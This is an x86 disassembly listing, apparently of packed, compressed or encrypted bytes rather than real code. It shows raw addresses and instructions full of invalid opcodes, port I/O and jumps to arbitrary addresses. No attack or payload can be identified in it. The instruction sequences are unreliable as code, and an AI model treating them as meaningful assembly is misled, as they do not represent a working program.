  42754a:	adc    DWORD PTR [ecx],eax
  42754c:	loopne 0x427504
  42754e:	jne    0x42754b
  427550:	fcom   DWORD PTR [esi+edi*4]
  427553:	add    eax,0x4ac783fe
  427558:	adc    DWORD PTR [ebx-0x6f],ecx
  42755b:	ja     0x4275bf
  42755d:	xchg   esi,eax
  42755e:	ror    BYTE PTR [eax],1
  427560:	push   0x59c96117
  427565:	push   eax
  427566:	dec    edx
  427567:	lods   eax,DWORD PTR ds:[esi]
  427568:	ins    DWORD PTR es:[edi],dx
  427569:	cmp    BYTE PTR [eax+0x61ea1ee],0x89
  427570:	fdiv   QWORD PTR [eax+ecx*8-0x28]
  427574:	mov    dh,0x8d
  427576:	test   DWORD PTR [eax+0x31],esp
  427579:	sub    eax,0xfd17332a
  42757e:	mov    dh,0x5d
  427580:	push   0x57
  427582:	pop    esp
  427583:	pop    eax
  427584:	mov    eax,0xb37482d3
  427589:	imul   ecx,edi,0xc6b76b0b
  42758f:	mov    bh,BYTE PTR cs:[ecx-0x28]
  427593:	add    edi,eax
  427595:	dec    esi
  427596:	loopne 0x4275c7
  427598:	ja     0x42754b
  42759a:	je     0x427527
  42759c:	ins    DWORD PTR es:[edi],dx
  42759d:	dec    esp
  42759e:	mov    WORD PTR ds:0xcb468af6,ss
  4275a4:	cld    
  4275a5:	pop    edx
  4275a6:	stos   DWORD PTR es:[edi],eax
  4275a7:	aam    0x14
  4275a9:	arpl   WORD PTR [ebp-0x7a8bf174],ax
  4275af:	test   DWORD PTR [ebp-0x51923723],ebp
  4275b5:	ja     0x427579
  4275b7:	std    
  4275b8:	scas   eax,DWORD PTR es:[edi]
  4275b9:	or     DWORD PTR [edx+ebx*8],esi
  4275bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4275bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4275be:	lods   eax,DWORD PTR ds:[esi]
  4275bf:	xchg   edx,eax
  4275c0:	scas   eax,DWORD PTR es:[edi]
  4275c1:	mov    al,ds:0xb23522c5
  4275c6:	(bad)  
  4275c7:	into   
  4275c8:	lea    ebp,[ebp+0x6b]
  4275cb:	fld    TBYTE PTR [esi*4-0x4e8c660e]
  4275d2:	mov    al,0x20
  4275d4:	aad    0x6d
  4275d6:	inc    eax
  4275d7:	test   eax,0xa49b5fb6
  4275dc:	(bad)  
  4275dd:	and    al,0xc6
  4275df:	mov    dh,0x8d
  4275e1:	lods   eax,DWORD PTR ds:[esi]
  4275e2:	mov    al,0xcb
  4275e4:	int3   
  4275e5:	sbb    esp,ebp
  4275e7:	jbe    0x427652
  4275e9:	adc    bh,BYTE PTR [ebp-0x9]
  4275ec:	aaa    
  4275ed:	mov    dh,0xb6
  4275ef:	ffree  st(2)
  4275f1:	cs es pop esp
  4275f4:	push   cs
  4275f5:	dec    ebp
  4275f6:	clc    
  4275f7:	cmp    BYTE PTR [esi],bl
  4275f9:	ret    0x5dda
  4275fc:	ficom  DWORD PTR [esi-0x4c1f78e6]
  427602:	xor    eax,0x4877801f
  427607:	mov    bh,0x85
  427609:	ins    DWORD PTR es:[edi],dx
  42760a:	mov    eax,ds:0x597eb547
  42760f:	in     al,dx
  427610:	test   eax,0x23e5fee6
  427615:	sbb    ebx,DWORD PTR [ebx]
  427617:	pop    ebp
  427618:	add    bh,bl
  42761a:	jne    0x42767f
  42761c:	or     BYTE PTR [ebx+ebx*4],ah
  42761f:	sar    BYTE PTR [eax-0x18c4924f],1
  427625:	stos   BYTE PTR es:[edi],al
  427626:	dec    esi
  427627:	mov    ebp,0x5bf92e42
  42762c:	pop    ebx
  42762d:	pop    ebx
  42762e:	mov    eax,0x7fbf9edf
  427633:	add    DWORD PTR [esi+0x41],ebp
  427636:	adc    eax,0x42ad279a
  42763b:	mov    ah,0x5b
  42763d:	push   ss
  42763e:	sbb    esi,DWORD PTR [ecx+0x4c]
  427641:	sub    eax,0x3636ddca
  427646:	mov    dh,0x83
  427648:	stos   BYTE PTR es:[edi],al
  427649:	fs inc ebp
  42764b:	popf   
  42764c:	js     0x42763e
  42764e:	in     al,dx
  42764f:	and    DWORD PTR [edi-0x4aacf57b],ebx
  427655:	repnz inc esi
  427657:	and    al,0x54
  427659:	fld    TBYTE PTR [ebp+0x6b]
  42765c:	fist   DWORD PTR [ebp+0x7a13f5ff]
  427662:	xlat   BYTE PTR ds:[ebx]
  427663:	xchg   edi,eax
  427664:	xchg   ebp,eax
  427665:	mov    eax,0xd59923f4
  42766a:	inc    esi
  42766b:	pop    es
  42766c:	ins    DWORD PTR es:[edi],dx
  42766d:	mov    edi,0xe15dac30
  427672:	retf   0xd1ba
  427675:	inc    eax
  427676:	dec    ebx
  427677:	dec    esi
  427678:	ret    0x39a7
  42767b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42767c:	push   ecx
  42767d:	mov    bh,0x2a
  42767f:	retf   0xa942
  427682:	inc    ebp
  427683:	scas   eax,DWORD PTR es:[edi]
  427684:	pop    eax
  427685:	pop    ebx
  427686:	jmp    0x9b0c4741
  42768b:	sbb    eax,0x98544008
  427690:	sbb    DWORD PTR [edx],0x7f
  427693:	mov    eax,ds:0x777aaa6d
  427698:	fdiv   QWORD PTR [esi+0x44]
  42769b:	in     eax,0x8d
  42769d:	add    DWORD PTR [eax],0xffffff8c
  4276a0:	push   ebx
  4276a1:	add    BYTE PTR [ecx-0x1635c8f6],ah
  4276a7:	jle    0x4276d9
  4276a9:	sub    cl,cl
  4276ab:	test   eax,0xfcb404a9
  4276b0:	inc    edx
  4276b1:	inc    eax
  4276b2:	fiadd  DWORD PTR [esi+0x0]
  4276b5:	popa   
  4276b6:	in     eax,0xe8
  4276b8:	ins    BYTE PTR es:[edi],dx
  4276b9:	(bad)  [esi-0x30b5572f]
  4276bf:	mov    ds:0x4b713e11,eax
  4276c4:	pop    edi
  4276c5:	or     DWORD PTR [eax],0xf66db1ba
  4276cb:	(bad)  
  4276cd:	jo     0x42770b
  4276cf:	lahf   
  4276d0:	(bad)  
  4276d1:	fistp  DWORD PTR [eax+0x58]
  4276d4:	call   0x86a44cd9
  4276d9:	sub    dl,dh
  4276db:	leave  
  4276dc:	shl    ebx,cl
  4276de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4276df:	push   0xffffff89
  4276e1:	pusha  
  4276e2:	jnp    0x427674
  4276e4:	div    al
  4276e6:	xchg   edi,eax
  4276e7:	mov    dh,0x25
  4276e9:	(bad)  
  4276eb:	(bad)  
  4276ec:	and    BYTE PTR [edx-0x6f],ch
  4276ef:	lds    esi,FWORD PTR [ebx]
  4276f1:	retf   
  4276f2:	mov    dh,0xf3
  4276f4:	pop    ebp
  4276f5:	sub    BYTE PTR [edx+ebp*2-0x53],bl
  4276f9:	into   
  4276fa:	hlt    
  4276fb:	mov    dh,0xfa
  4276fd:	icebp  
  4276fe:	fcmovnb st,st(0)
  427700:	push   0x74a16361
  427705:	mov    al,ds:0xbb720f2b
  42770a:	xchg   esp,eax
  42770b:	sub    BYTE PTR [eax],dl
  42770d:	pop    ebx
  42770e:	test   edx,ecx
  427710:	shl    BYTE PTR [eax+0x55b81673],1
  427716:	add    ah,al
  427718:	jbe    0x4276b3
  42771a:	daa    
  42771b:	stc    
  42771c:	mov    ebp,DWORD PTR [edx]
  42771e:	mov    eax,0x1826da50
  427723:	(bad)  
  427724:	rcr    ch,1
  427726:	push   edx
  427727:	fisubr DWORD PTR [ebp+0x63]
  42772a:	jmp    0x4276b4
  42772c:	out    0x80,al
  42772e:	jo     0x42778a
  427730:	and    cl,BYTE PTR [edx+esi*1-0x2e4fbb28]
  427737:	push   ebp
  427738:	fdiv   QWORD PTR ds:0xa7b14f4f
  42773e:	out    0x13,eax
  427740:	test   DWORD PTR [ebp-0x2b6e4ebb],ebp
  427746:	jae    0x4276e3
  427748:	or     edx,esp
  42774a:	rcl    BYTE PTR [edx+0x17],cl
  42774d:	rcr    BYTE PTR [ebx+ecx*2+0x7d],1
  427751:	sbb    eax,edi
  427753:	mov    esi,0x83a36d47
  427758:	call   0xd8e087d7
  42775d:	imul   ecx,DWORD PTR [ecx+0x53],0x85a5b714
  427764:	cmp    ecx,DWORD PTR [edx]
  427766:	js     0x427715
  427768:	and    bl,ah
  42776a:	icebp  
  42776b:	in     al,dx
  42776c:	push   ebp
  42776d:	fcmovnb st,st(2)
  42776f:	(bad)  
  427770:	(bad)  
  427771:	adc    dh,BYTE PTR [edi+0xa]
  427774:	jae    0x4277d3
  427776:	(bad)  
  427777:	push   eax
  427778:	pop    ebx
  427779:	and    BYTE PTR [edx+0x28],bl
  42777c:	xor    ebp,DWORD PTR [ebx]
  42777e:	add    DWORD PTR [esi-0x549e8524],ebp
  427784:	lock imul edx,eax,0x285bc5bc
  42778b:	std    
  42778c:	push   ds
  42778d:	test   edx,0xf66b70ad
  427793:	inc    eax
  427794:	push   ecx
  427795:	cmc    
  427796:	xlat   BYTE PTR fs:[ebx]
  427798:	mov    ebx,0x2584f5c
  42779d:	fcomp  st(2)
  42779f:	lods   eax,DWORD PTR ds:[esi]
  4277a0:	xchg   dh,cl
  4277a2:	mov    esi,DWORD PTR [esi+0x6d2b766e]
  4277a8:	add    BYTE PTR [ebp-0x64],ch
  4277ab:	or     al,0xaa
  4277ad:	add    ch,BYTE PTR [esi+0x7]
  4277b0:	inc    edi
  4277b1:	sbb    esp,DWORD PTR [ebp+0x65b3a502]
  4277b7:	inc    esp
  4277b8:	cmp    DWORD PTR [ebx-0x5d4497a4],edx
  4277be:	fsub   QWORD PTR ds:0x34e9bd2c
  4277c4:	sbb    BYTE PTR [ecx+0x7ed85942],0xe1
  4277cb:	mov    BYTE PTR [edi+ebp*8],bl
  4277ce:	aas    
  4277cf:	jg     0x427839
  4277d1:	add    DWORD PTR [ebx],ebx
  4277d3:	add    BYTE PTR [esi-0x49152613],dh
  4277d9:	push   esp
  4277da:	xchg   BYTE PTR [ebx+eax*2-0x54],ch
  4277de:	inc    ecx
  4277df:	mov    al,0x2d
  4277e1:	xor    eax,0x2969bf11
  4277e6:	cld    
  4277e7:	cmp    DWORD PTR [esi-0x4f492494],eax
  4277ed:	icebp  
  4277ee:	sbb    al,0x3d
  4277f0:	(bad)  
  4277f1:	pop    ecx
  4277f2:	mov    cl,0x80
  4277f4:	ja     0x427852
  4277f6:	cs in  eax,dx
  4277f8:	inc    edx
  4277f9:	mov    ebx,0x17d5402d
  4277fe:	mov    ds:0x1f46e98d,al
  427803:	mov    bl,BYTE PTR [edi-0x2a]
  427806:	outs   dx,BYTE PTR ds:[esi]
  427807:	ins    DWORD PTR es:[edi],dx
  427808:	test   edi,ebx
  42780a:	cs (bad) 
  42780c:	lock mov ds:0xead7838,eax
  427812:	ins    DWORD PTR es:[edi],dx
  427813:	mov    ecx,0xe056d0b5
  427818:	les    edx,FWORD PTR [esi]
  42781a:	jb     0x427832
  42781c:	inc    edi
  42781d:	push   esi
  42781e:	mov    ebp,DWORD PTR [eax-0x65]
  427821:	or     BYTE PTR [esi+esi*1+0x6d8f42c8],0x8a
  427829:	outs   dx,BYTE PTR ds:[esi]
  42782a:	lea    ebx,[ebx-0x56]
  42782d:	and    ecx,DWORD PTR [edi]
  42782f:	daa    
  427830:	out    dx,eax
  427831:	mov    ch,0x46
  427834:	inc    edi
  427835:	mov    ch,0x6d
  427837:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427838:	nop
  427839:	adc    DWORD PTR [esp+ecx*1+0x1c],ebx
  42783d:	shl    DWORD PTR [edi],cl
  42783f:	rol    dh,0xb6
  427842:	rcr    BYTE PTR [ebp+0x33e3c7b6],1
  427848:	aad    0x43
  42784a:	ins    DWORD PTR es:[edi],dx
  42784b:	mov    ds:0xfaa34b6d,eax
  427850:	lods   eax,DWORD PTR ds:[esi]
  427851:	je     0x4277d3
  427853:	lea    eax,[esp+edx*8-0x25c92250]
  42785a:	and    BYTE PTR [ebx+0x11],dh
  42785d:	dec    esi
  42785e:	jl     0x4278bf
  427860:	mov    bh,0x33
  427862:	push   eax
  427863:	xchg   edi,eax
  427864:	pop    ebx
  427865:	in     eax,dx
  427866:	inc    edx
  427867:	inc    ebx
  427868:	retf   
  427869:	xchg   ebp,eax
  42786a:	jg     0x427889
  42786c:	fcmovnbe st,st(7)
  42786e:	imul   ebp
  427870:	mov    ebx,0x580bb6d0
  427875:	lods   eax,DWORD PTR ds:[esi]
  427876:	push   es
  427877:	mov    WORD PTR [ecx+edx*1+0x77280e58],ds
  42787e:	ins    BYTE PTR es:[edi],dx
  42787f:	sbb    edx,esp
  427881:	push   edx
  427882:	out    dx,eax
  427883:	xor    al,0xaa
  427885:	mov    cl,0xfb
  427887:	sub    dh,BYTE PTR [esi-0x1e92ee30]
  42788d:	and    DWORD PTR [edi],esp
  42788f:	push   es
  427890:	and    eax,0x2ed8ec2b
  427895:	mov    ah,0xdb
  427897:	mov    ch,0xe0
  427899:	sti    
  42789a:	sar    BYTE PTR [ebx],cl
  42789c:	cmp    eax,0x20717654
  4278a1:	mov    ch,0xed
  4278a3:	mov    dh,0x51
  4278a5:	jns    0x427879
  4278a7:	sbb    BYTE PTR [ecx+0x7f],0x24
  4278ab:	cmp    BYTE PTR [edx+0x8],0x8a
  4278af:	fcmovnbe st,st(6)
  4278b1:	mov    eax,0x4eb24ebf
  4278b6:	out    dx,eax
  4278b7:	xchg   esi,eax
  4278b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4278b9:	lar    edx,si
  4278bc:	xchg   esi,eax
  4278bd:	and    BYTE PTR [esi+0x1c70f834],0x80
  4278c4:	xchg   ebx,eax
  4278c5:	push   ss
  4278c6:	fiadd  DWORD PTR [edx]
  4278c8:	ror    BYTE PTR ds:0xa3e0fe0a,0xac
  4278cf:	ins    DWORD PTR es:[edi],dx
  4278d0:	mov    edx,DWORD PTR [esi]
  4278d2:	ss xchg ebx,eax
  4278d4:	fwait
  4278d5:	cmp    cl,bh
  4278d7:	cwde   
  4278d8:	jmp    0x4278c6
  4278da:	sub    edx,DWORD PTR [esi+0x61264b6e]
  4278e0:	into   
  4278e1:	scas   eax,DWORD PTR es:[edi]
  4278e2:	scas   eax,DWORD PTR es:[edi]
  4278e3:	out    dx,eax
  4278e4:	mov    eax,0xb70a26a2
  4278e9:	mov    dh,0xd5
  4278eb:	mov    eax,ds:0xa7e06b17
  4278f0:	dec    esp
  4278f1:	fnstenv [eax-0x23aa4fd3]
  4278f7:	sub    esi,esi
  4278f9:	mov    al,0xc8
  4278fb:	dec    eax
  4278fc:	or     ecx,DWORD PTR [ebx]
  4278fe:	dec    ebx
  4278ff:	sbb    eax,0x16624d15
  427904:	jl     0x42793f
  427906:	int    0x2a
  427908:	outs   dx,BYTE PTR ds:[esi]
  427909:	pop    ebx
  42790a:	or     ecx,DWORD PTR [ebp+0x76079688]
  427910:	cmp    bh,BYTE PTR [esi-0x27517e29]
  427916:	adc    BYTE PTR [ebp-0x7e],ch
  427919:	pop    edx
  42791a:	clc    
  42791b:	cmp    BYTE PTR [eax+edi*1+0x13],ah
  42791f:	fadd   DWORD PTR [ecx+0x6d]
  427922:	stos   BYTE PTR es:[edi],al
  427923:	sub    BYTE PTR [ebx],bh
  427925:	loope  0x427947
  427927:	jge    0x4278f3
  427929:	mov    dh,0x8d
  42792b:	lods   eax,DWORD PTR ds:[esi]
  42792c:	sub    DWORD PTR [ecx],ecx
  42792e:	jne    0x42791c
  427930:	test   edi,ecx
  427932:	je     0x42797b
  427934:	xchg   esp,eax
  427935:	rol    DWORD PTR [esi],1
  427937:	sub    BYTE PTR [ebx+eiz*4],dl
  42793a:	lds    ebp,FWORD PTR [edi-0x44925ea8]
  427940:	ins    DWORD PTR es:[edi],dx
  427941:	dec    ebp
  427942:	mov    edi,0x2e43256
  427947:	push   ss
  427948:	jmp    0x1b6:0xc447cf6e
  42794f:	ins    BYTE PTR es:[edi],dx
  427950:	sti    
  427951:	aam    0x59
  427953:	into   
  427954:	sub    al,0xac
  427956:	mov    ebx,0x5136d52d
  42795b:	push   edi
  42795c:	in     eax,dx
  42795d:	enter  0x63ab,0x98
  427961:	fs lahf 
  427963:	sub    al,0x5b
  427965:	loope  0x42797d
  427967:	pop    ebx
  427968:	out    0x58,al
  42796a:	xchg   ebx,eax
  42796b:	rol    BYTE PTR [ecx-0x4590c24e],cl
  427971:	stos   BYTE PTR es:[edi],al
  427972:	or     ebx,DWORD PTR [ebx]
  427974:	dec    eax
  427975:	dec    eax
  427976:	inc    ebx
  427977:	icebp  
  427978:	xchg   ecx,eax
  427979:	fucomp st(2)
  42797b:	fild   QWORD PTR [esi]
  42797d:	outs   dx,DWORD PTR ds:[esi]
  42797e:	aaa    
  42797f:	outs   dx,DWORD PTR ds:[esi]
  427980:	mov    BYTE PTR [ecx-0x35],0xa8
  427984:	add    al,ah
  427986:	je     0x427940
  427988:	enter  0x66,0x25
  42798c:	loopne 0x427942
  42798e:	pop    edi
  42798f:	pop    esp
  427990:	sub    dl,BYTE PTR [edx+edx*4]
  427993:	jnp    0x427946
  427995:	mov    ?,WORD PTR [ecx+ebp*1]
  427998:	popa   
  427999:	imul   esp,DWORD PTR [edx],0x6e
  42799c:	ins    BYTE PTR es:[edi],dx
  42799d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42799e:	call   0x159ef202
  4279a3:	out    dx,al
  4279a4:	xor    eax,0x996176a8
  4279a9:	sub    ebp,DWORD PTR [eax-0x3e521fbb]
  4279af:	push   esi
  4279b0:	sub    BYTE PTR [edx+eax*8],ch
  4279b3:	ret    0x8707
  4279b6:	and    BYTE PTR [eax],cl
  4279b8:	sbb    al,BYTE PTR [eax]
  4279ba:	dec    ebx
  4279bb:	or     eax,0x21051fd7
  4279c0:	mov    ah,0xd8
  4279c2:	sub    ch,bl
  4279c4:	fmul   DWORD PTR [edi]
  4279c6:	ret    
  4279c7:	add    ebx,ecx
  4279c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4279ca:	mov    al,0x51
  4279cc:	nop
  4279cd:	sbb    esi,DWORD PTR [edi+0x2645b6d]
  4279d3:	xor    ch,BYTE PTR [ecx+ebp*8-0x413f9101]
  4279da:	ins    BYTE PTR es:[edi],dx
  4279db:	sahf   
  4279dc:	sar    BYTE PTR [esi-0x24],1
  4279df:	push   0x12efd538
  4279e4:	leave  
  4279e5:	test   BYTE PTR [esi-0x2f],ch
  4279e8:	ins    BYTE PTR es:[edi],dx
  4279e9:	ins    DWORD PTR es:[edi],dx
  4279ea:	jecxz  0x4279a2
  4279ec:	call   0xc9ab:0x1be64754
  4279f3:	mov    esp,0x6f9746d7
  4279f8:	xor    eax,0x6782612e
  4279fd:	push   es
  4279fe:	popa   
  4279ff:	sbb    al,0x46
  427a01:	add    BYTE PTR [ecx-0x71],ch
  427a04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a05:	fidiv  DWORD PTR [esi+0x6b]
  427a08:	ins    DWORD PTR es:[edi],dx
  427a09:	sub    DWORD PTR [esi],ebx
  427a0b:	fist   WORD PTR [edx-0x2bc12025]
  427a11:	add    eax,0x36d6edb
  427a16:	stc    
  427a17:	jo     0x4279f3
  427a19:	mov    esi,edi
  427a1b:	mov    bh,0xbc
  427a1d:	push   ebx
  427a1e:	pop    ecx
  427a1f:	fcmovnbe st,st(6)
  427a21:	outs   dx,BYTE PTR ds:[esi]
  427a22:	gs retf 0x74ce
  427a26:	sbb    ch,bl
  427a28:	fidiv  DWORD PTR [esi-0x4e4ad44d]
  427a2e:	mov    eax,ds:0xc7029b6e
  427a33:	pop    esi
  427a34:	jno    0x4279b6
  427a36:	mov    ds:0xddadb73d,al
  427a3b:	mov    al,ds:0xa5e3dbee
  427a40:	dec    edx
  427a41:	jmp    0x722f0a2a
  427a46:	ins    DWORD PTR es:[edi],dx
  427a47:	xchg   esp,eax
  427a48:	ds ins DWORD PTR es:[edi],dx
  427a4a:	ret    0x5340
  427a4d:	cmp    DWORD PTR [edx],esi
  427a4f:	cmc    
  427a50:	add    edx,DWORD PTR [edi+0x5b]
  427a53:	or     ebp,DWORD PTR [ebp-0x45]
  427a56:	sar    DWORD PTR [ebp-0x70393aac],1
  427a5c:	and    BYTE PTR [esi-0x6c],0x14
  427a60:	outs   dx,BYTE PTR ds:[esi]
  427a61:	or     eax,DWORD PTR [ebp-0x6d51af73]
  427a67:	jg     0x427aac
  427a69:	inc    edi
  427a6a:	and    BYTE PTR ds:0xba006b05,ch
  427a70:	adc    eax,0x5c244d4c
  427a75:	fwait
  427a76:	pop    eax
  427a77:	jp     0x427a3f
  427a79:	(bad)  
  427a7a:	add    DWORD PTR [esp+ebx*8+0x38],esi
  427a7e:	add    al,0x20
  427a80:	mov    dh,0x62
  427a82:	push   es
  427a83:	xor    eax,0x4cc305d4
  427a88:	pop    es
  427a89:	and    bl,dh
  427a8b:	mov    ch,0xac
  427a8d:	push   edx
  427a8e:	mov    dh,0x2b
  427a90:	pusha  
  427a91:	mov    ebx,0x833767da
  427a96:	jo     0x427a46
  427a98:	dec    eax
  427a99:	and    dl,BYTE PTR [esi-0x25]
  427a9c:	push   ecx
  427a9d:	pop    ss
  427a9e:	fidivr DWORD PTR [ebx+0x6b72e02]
  427aa4:	loope  0x427acd
  427aa6:	popa   
  427aa7:	dec    ebp
  427aa8:	add    eax,0x68505a16
  427aad:	jo     0x427ac0
  427aaf:	lea    esi,[edi-0x7197fe53]
  427ab5:	or     al,0x3e
  427ab7:	enter  0x2b2,0x9a
  427abb:	pop    esi
  427abc:	or     ebx,DWORD PTR [ebx]
  427abe:	retf   
  427abf:	sbb    esi,DWORD PTR [edi-0x2f11ff26]
  427ac5:	out    0x3d,eax
  427ac7:	mov    dl,0x2e
  427ac9:	sbb    ecx,DWORD PTR [ebx-0x7b]
  427acc:	or     ebp,DWORD PTR [eax]
  427ace:	int    0x5a
  427ad0:	(bad)  
  427ad1:	ds xchg ebx,eax
  427ad3:	imul   edx,DWORD PTR [esi+0x16],0x5c6db0b4
  427ada:	dec    eax
  427adb:	stos   BYTE PTR es:[edi],al
  427adc:	adc    esp,DWORD PTR [esp+edx*2-0x3b]
  427ae0:	test   al,0x5b
  427ae2:	pop    ss
  427ae3:	lds    ebx,FWORD PTR [ebp+0x2b]
  427ae6:	repz pop esp
  427ae9:	and    BYTE PTR [edi],dl
  427aeb:	ss push ss
  427aed:	call   0x8a18:0x99d5f0d
  427af4:	jl     0x427ac4
  427af6:	mov    ah,0x3c
  427af8:	mov    edx,0x9300e56d
  427afd:	add    al,0xcb
  427aff:	in     eax,0x95
  427b01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b02:	ins    DWORD PTR es:[edi],dx
  427b03:	fs call 0x6d8fe9b3
  427b09:	cmc    
  427b0a:	(bad)
  427b0e:	fst    QWORD PTR [esi+0x29]
  427b11:	fcomp  st(0)
  427b13:	cmp    DWORD PTR [edx+0x4f4e46c6],edi
  427b19:	mov    dh,0xb5
  427b1b:	in     eax,dx
  427b1c:	mov    BYTE PTR [ecx],0x72
  427b1f:	xchg   edx,eax
  427b20:	xlat   BYTE PTR ds:[ebx]
  427b21:	jno    0x427b04
  427b23:	jmp    0xb7b99dcf
  427b28:	lods   eax,DWORD PTR ds:[esi]
  427b29:	add    esp,edx
  427b2b:	mov    esp,0x3e8102ec
  427b30:	(bad)  
  427b31:	fnsave [edx+0x4dad6c31]
  427b37:	add    eax,0x1095c368
  427b3c:	inc    esp
  427b3d:	test   BYTE PTR [ebp+0x44b4b1b],dh
  427b43:	mov    DWORD PTR [edi-0x72e66ea],edi
  427b49:	loopne 0x427ba6
  427b4b:	or     ebx,DWORD PTR [ebx]
  427b4d:	mov    ah,0x2f
  427b4f:	mov    ecx,0x16a664a3
  427b54:	jg     0x427b4b
  427b56:	mov    eax,0xe50b2d
  427b5b:	sub    dh,BYTE PTR [ebp+0x5c599c8e]
  427b61:	repz sbb eax,0x22edb6d0
  427b67:	or     BYTE PTR [ecx+edx*2+0x5a739c5],dh
  427b6e:	ss mov dh,0x2d
  427b71:	jb     0x427afb
  427b73:	adc    al,0x20
  427b75:	loopne 0x427b7a
  427b77:	js     0x427b75
  427b79:	(bad)  [esi-0x443d25a3]
  427b7f:	or     BYTE PTR [edi],al
  427b81:	fdiv   DWORD PTR [eax+eax*2-0xb]
  427b85:	push   esp
  427b86:	push   esi
  427b87:	fnstenv [esi]
  427b89:	mov    ds:0xf25f6c6d,al
  427b8e:	shl    bl,0x44
  427b91:	clc    
  427b92:	jns    0x427c04
  427b94:	pop    ebx
  427b95:	fcomp  DWORD PTR [esi]
  427b97:	inc    eax
  427b98:	dec    esi
  427b99:	sub    al,0xef
  427b9b:	out    dx,al
  427b9c:	iret   
  427b9d:	xor    eax,0x5b54e6a6
  427ba2:	fist   DWORD PTR [eax+0x55]
  427ba5:	fisub  WORD PTR [ebx+0x1b07d4a1]
  427bab:	ins    DWORD PTR es:[edi],dx
  427bac:	adc    ebp,DWORD PTR [eax*1+0x2c54c2ec]
  427bb3:	mov    esp,0xb63604b1
  427bb8:	or     ebx,DWORD PTR [ebx]
  427bba:	sub    BYTE PTR ss:[esi-0x43],al
  427bbe:	and    eax,0x109ff144
  427bc3:	mov    ch,0x66
  427bc5:	or     bl,al
  427bc7:	(bad)  
  427bc8:	in     eax,0xf1
  427bca:	sbb    al,0x14
  427bcc:	mov    eax,ds:0x226d142d
  427bd1:	mov    eax,ss:0x62cda48e
  427bd7:	imul   esi,DWORD PTR [edi+0x3d35b56d],0xffffff80
  427bde:	shr    BYTE PTR ds:0xc4ed7ae3,0x42
  427be5:	arpl   WORD PTR [ebx+0x5bb1230f],ax
  427beb:	adc    esi,DWORD PTR [ebx]
  427bed:	adc    eax,0xe7027d6e
  427bf2:	sub    BYTE PTR [ebx],ch
  427bf4:	push   edi
  427bf5:	mov    ss,WORD PTR [esi+0x41]
  427bf8:	ins    DWORD PTR es:[edi],dx
  427bf9:	pop    ebp
  427bfa:	jno    0x427c5f
  427bfc:	adc    DWORD PTR [eax+esi*8+0x9],0xaf0821b7
  427c04:	sub    eax,0xc8b80b85
  427c09:	aam    0xe3
  427c0b:	jmp    FWORD PTR [esi]
  427c0d:	iret   
  427c0e:	mov    dh,0xa1
  427c10:	cs sub al,0x5f
  427c13:	mov    al,ds:0x1176dc1
  427c18:	lods   eax,DWORD PTR ds:[esi]
  427c19:	lea    eax,[ebx-0x3fcbfb4a]
  427c1f:	aaa    
  427c20:	popf   
  427c21:	stos   DWORD PTR es:[edi],eax
  427c22:	test   eax,0x51d53582
  427c27:	rol    DWORD PTR [ebp-0x36fb794e],1
  427c2d:	xor    ebp,DWORD PTR [esi-0x25]
  427c30:	mov    dh,0xb5
  427c32:	(bad)  
  427c33:	or     al,0xbb
  427c35:	fucom  st(3)
  427c37:	pop    esp
  427c38:	and    BYTE PTR [ebx+0x2],bh
  427c3b:	sub    ebx,DWORD PTR [ebx-0x249eafb6]
  427c41:	mov    eax,ds:0x2e52353d
  427c46:	sbb    BYTE PTR [edx-0x45],dl
  427c49:	xchg   ebp,eax
  427c4a:	sub    BYTE PTR [edx-0x29],ah
  427c4d:	bound  ebp,QWORD PTR [ebp+esi*1-0x495a2556]
  427c54:	cld    
  427c55:	jmp    0xb4737c8a
  427c5a:	stos   DWORD PTR es:[edi],eax
  427c5b:	jecxz  0x427c22
  427c5d:	mov    bh,dh
  427c5f:	in     al,dx
  427c60:	fwait
  427c61:	mov    ds:0x3da4d851,al
  427c66:	jo     0x427cc6
  427c68:	xor    al,0x77
  427c6a:	dec    esi
  427c6b:	mov    edx,0x956c1535
  427c70:	xchg   esi,eax
  427c71:	sbb    eax,0x26e4e6ff
  427c76:	adc    eax,0xb7a9adb7
  427c7b:	xor    DWORD PTR [ecx-0x39],0xbadebfad
  427c82:	shl    BYTE PTR [esi+0x58818536],1
  427c88:	inc    eax
  427c89:	cli    
  427c8a:	pop    ecx
  427c8b:	sub    BYTE PTR [eax],ah
  427c8d:	(bad)  
  427c8e:	lea    ecx,[ebp+0x3546d806]
  427c94:	mov    ebx,0x7b602753
  427c99:	push   esp
  427c9a:	ins    BYTE PTR es:[edi],dx
  427c9b:	pop    ss
  427c9c:	mov    dh,0xfc
  427c9e:	sub    DWORD PTR [edx-0x2567448a],eax
  427ca4:	inc    BYTE PTR [esi]
  427ca6:	add    dh,BYTE PTR gs:[esi]
  427ca9:	push   cx
  427cab:	(bad)  
  427cac:	pop    ds
  427cad:	push   cs
  427cae:	mov    dh,0xaf
  427cb0:	outs   dx,BYTE PTR ds:[esi]
  427cb1:	fistp  DWORD PTR [ebx+eiz*1]
  427cb4:	jge    0x427c7e
  427cb6:	fmul   QWORD PTR [edi]
  427cb8:	pop    DWORD PTR [eax+0x605dd96b]
  427cbe:	fistp  DWORD PTR [edx-0x24]
  427cc1:	popa   
  427cc2:	addr16 sahf 
  427cc4:	adc    BYTE PTR [eax],al
  427cc6:	mov    esi,gs
  427cc8:	pop    ebx
  427cc9:	and    BYTE PTR [ebp+esi*4+0x5f],bl
  427ccd:	add    al,0xbe
  427ccf:	loop   0x427c6e
  427cd1:	mov    bl,0xdb
  427cd3:	fidiv  DWORD PTR [esi+0x61]
  427cd6:	push   ds
  427cd7:	(bad)  
  427cd8:	int3   
  427cd9:	or     eax,0xe956e9bf
  427cde:	xchg   ecx,eax
  427cdf:	aam    0x8a
  427ce1:	sbb    eax,0x23b66dd0
  427ce6:	mov    ch,0xfb
  427ce8:	cli    
  427ce9:	cdq    
  427cea:	clc    
  427ceb:	mov    dh,0x75
  427ced:	add    al,0x6c
  427cef:	jbe    0x427d4a
  427cf1:	sub    ecx,0xffffffd2
  427cf4:	sbb    edi,0x56
